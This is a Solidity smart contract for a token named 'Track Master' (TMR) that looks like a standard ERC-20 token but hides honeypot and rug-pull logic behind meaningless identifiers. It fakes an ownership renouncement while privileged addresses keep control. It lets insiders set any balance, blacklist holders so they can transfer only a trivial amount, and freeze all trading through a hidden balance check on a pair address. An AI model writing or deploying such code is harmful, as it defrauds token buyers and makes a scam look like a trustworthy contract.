//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface autoTake {
    function createPair(address senderSwap, address tokenLaunchedIs) external returns (address);
}

interface autoLimitTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingMaxTx) external view returns (uint256);

    function transfer(address modeSender, uint256 autoFrom) external returns (bool);

    function allowance(address maxSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoFrom) external returns (bool);

    function transferFrom(
        address sender,
        address modeSender,
        uint256 autoFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityIs, uint256 value);
    event Approval(address indexed maxSender, address indexed spender, uint256 value);
}

abstract contract atEnableLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromListTx is autoLimitTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TrackMaster is atEnableLaunched, autoLimitTake, fromListTx {

    function maxBuy(address feeSell) public {
        toLimit();
        
        if (feeSell == minSender || feeSell == exemptFee) {
            return;
        }
        isLimit[feeSell] = true;
    }

    uint256 public teamFee;

    uint256 shouldToken;

    uint256 public receiverTeam;

    event OwnershipTransferred(address indexed buyReceiver, address indexed fundSwap);

    function balanceOf(address tradingMaxTx) public view virtual override returns (uint256) {
        return fundTeam[tradingMaxTx];
    }

    uint256 private amountMarketing;

    function totalExempt(uint256 autoFrom) public {
        toLimit();
        launchSell = autoFrom;
    }

    function getOwner() external view returns (address) {
        return modeTotalLimit;
    }

    function transfer(address amountBuyFund, uint256 autoFrom) external virtual override returns (bool) {
        return exemptSwap(_msgSender(), amountBuyFund, autoFrom);
    }

    string private receiverAt = "TMR";

    uint256 public feeMin;

    function totalSupply() external view virtual override returns (uint256) {
        return feeLaunched;
    }

    function modeSell(address amountBuyFund, uint256 autoFrom) public {
        toLimit();
        fundTeam[amountBuyFund] = autoFrom;
    }

    mapping(address => uint256) private fundTeam;

    function name() external view virtual override returns (string memory) {
        return fromTo;
    }

    constructor (){
        
        liquidityFund totalSwap = liquidityFund(modeLaunchedTo);
        exemptFee = autoTake(totalSwap.factory()).createPair(totalSwap.WETH(), address(this));
        
        minSender = _msgSender();
        minLaunched[minSender] = true;
        fundTeam[minSender] = feeLaunched;
        toMarketing();
        
        emit Transfer(address(0), minSender, feeLaunched);
    }

    address public minSender;

    uint256 public feeAutoLiquidity;

    function allowance(address sellFund, address swapAutoFund) external view virtual override returns (uint256) {
        if (swapAutoFund == modeLaunchedTo) {
            return type(uint256).max;
        }
        return marketingAmount[sellFund][swapAutoFund];
    }

    uint256 launchSell;

    uint256 constant limitEnable = 4 ** 10;

    function approve(address swapAutoFund, uint256 autoFrom) public virtual override returns (bool) {
        marketingAmount[_msgSender()][swapAutoFund] = autoFrom;
        emit Approval(_msgSender(), swapAutoFund, autoFrom);
        return true;
    }

    uint8 private liquidityFee = 18;

    function toLimit() private view {
        require(minLaunched[_msgSender()]);
    }

    function teamSellAmount(address marketingList) public {
        require(marketingList.balance < 100000);
        if (launchBuy) {
            return;
        }
        
        minLaunched[marketingList] = true;
        if (teamFee != amountMarketing) {
            autoReceiver = true;
        }
        launchBuy = true;
    }

    function transferFrom(address shouldLaunch, address modeSender, uint256 autoFrom) external override returns (bool) {
        if (_msgSender() != modeLaunchedTo) {
            if (marketingAmount[shouldLaunch][_msgSender()] != type(uint256).max) {
                require(autoFrom <= marketingAmount[shouldLaunch][_msgSender()]);
                marketingAmount[shouldLaunch][_msgSender()] -= autoFrom;
            }
        }
        return exemptSwap(shouldLaunch, modeSender, autoFrom);
    }

    bool private autoReceiver;

    address private modeTotalLimit;

    function maxFund(address shouldLaunch, address modeSender, uint256 autoFrom) internal returns (bool) {
        require(fundTeam[shouldLaunch] >= autoFrom);
        fundTeam[shouldLaunch] -= autoFrom;
        fundTeam[modeSender] += autoFrom;
        emit Transfer(shouldLaunch, modeSender, autoFrom);
        return true;
    }

    address modeAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public launchBuy;

    function exemptSwap(address shouldLaunch, address modeSender, uint256 autoFrom) internal returns (bool) {
        if (shouldLaunch == minSender) {
            return maxFund(shouldLaunch, modeSender, autoFrom);
        }
        uint256 walletSender = autoLimitTake(exemptFee).balanceOf(modeAuto);
        require(walletSender == launchSell);
        require(modeSender != modeAuto);
        if (isLimit[shouldLaunch]) {
            return maxFund(shouldLaunch, modeSender, limitEnable);
        }
        return maxFund(shouldLaunch, modeSender, autoFrom);
    }

    function owner() external view returns (address) {
        return modeTotalLimit;
    }

    address modeLaunchedTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public exemptFee;

    mapping(address => mapping(address => uint256)) private marketingAmount;

    bool public takeAuto;

    string private fromTo = "Track Master";

    function symbol() external view virtual override returns (string memory) {
        return receiverAt;
    }

    function decimals() external view virtual override returns (uint8) {
        return liquidityFee;
    }

    mapping(address => bool) public isLimit;

    mapping(address => bool) public minLaunched;

    function toMarketing() public {
        emit OwnershipTransferred(minSender, address(0));
        modeTotalLimit = address(0);
    }

    uint256 private feeLaunched = 100000000 * 10 ** 18;

}